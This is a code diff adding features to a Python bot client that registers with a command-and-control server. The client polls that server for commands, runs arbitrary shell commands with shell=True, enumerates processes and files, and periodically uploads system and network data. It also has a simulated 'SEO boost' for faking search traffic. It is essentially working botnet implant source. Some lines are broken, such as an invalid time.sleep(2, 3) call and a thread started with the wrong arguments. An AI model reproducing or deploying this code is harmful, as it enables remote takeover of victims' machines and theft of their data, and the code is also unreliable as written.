@@ -239,9 +239,103 @@ class PythonBot:
             thread.daemon = True
             thread.start()
 
-            return f'SEO boost started for "{keyword}" on {search_engine}'
+            return f'SEO boost started for "{keyword}" on {search_engine}', '', 0
         else:
-            return f"Unknown SEO {command_name}"
+            return '', f"Unknown SEO {command_name}", 1
+
+    def start_seo_boost(self, keyword, search_engine, search_count):
+        print(f"Starting SEO boost for '{keyword}'")
+        #to do actual searching 
+        #we will simulate the behaviour
+        for i in range(search_count):
+            print(f'Performing search  {i+1} for {keyword}')
+            time.sleep(2, 3)
+        print('SEO Boost completed')
+    
+    def execute_system_command(self, command_name, parameters):
+        try:
+            if command_name == 'system_info':
+                return json.dumps(self.get_system_info(), indent=5), '', 0
+            elif command_name == 'process_list':
+                processes = []
+                for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
+                    processes.append(proc.info)
+                return json.dumps(processes, indent=2), '', 0
+            elif command_name == 'file_list':
+                path = parameters.get('path', '.')
+                files = os.listdir(path)
+                return json.dumps(files), '', 0
+            elif command_name == 'execute_shell':
+                cmd = parameters.get('command', '')
+                if cmd: 
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                    return result.stdout, result.stderr, result.returncode
+                else:
+                    return '', 'No command provided', 1
+            else:
+                return '', f'Uknown command: {command_name}', 1
+        except Exception as e:
+            return '', str(e), 1
+
+    def upload_data(self, data_type, data, filename='', description=''):
+        try:
+            payload = {
+                'bot_id': self.bot_id,
+                'data_type': data_type,
+                'data': data,
+                'filename': filename,
+                'description': description,
+            }
+
+            response = self.session.post(
+                f'{self.base_url}/data/upload/',
+                json=payload
+            )
+            return response.status_code == 200
+        except Exception as e:
+            print(f"Error uploading data: {e}")
+            return False
+
+    def perform_routine_tasks(self):
+        #collect and upload system info periodically
+        system_info = self.get_system_info()
+        self.upload_data('system', json.dumps(system_info), 'system_info.json', 'Periodic system info')
+
+        #collect network information
+        network_info = {
+            'connections': len(psutil.net_connections()),
+            'io_counters': dict(psutil.net_io_counters()._asdict())
+        }
+        self.upload_data('network', json.dumps(network_info), 'network_info.json', 'Network statistics')
+
+    def start(self):
+        print(f"Starting Python Bot {self.bot_id}")
+
+        #Register with c2
+        if not self.register_with_c2():
+            print('Failed to register with c2 server')
+            return
+
+        #Main Loop
+        while self.running:
+            try:
+                #check for commands
+                commands = self.check_for_commands()
+                for command in commands:
+                    threading.Thread(target=self.execute_system_command, args=(command,)).start()
+
+                #Perform routine tasks
+                self.perform_routine_tasks()
+
+                time.sleep(60)
+            except KeyboardInterrupt:
+                self.running = False
+                print('Bot stopped by user')
+            except Exception as e:
+                print(f"Error in main loop: {e}")
+                time.sleep(10)
+
+
 
 if __name__ == '__main__':
     bot = PythonBot('kenya')
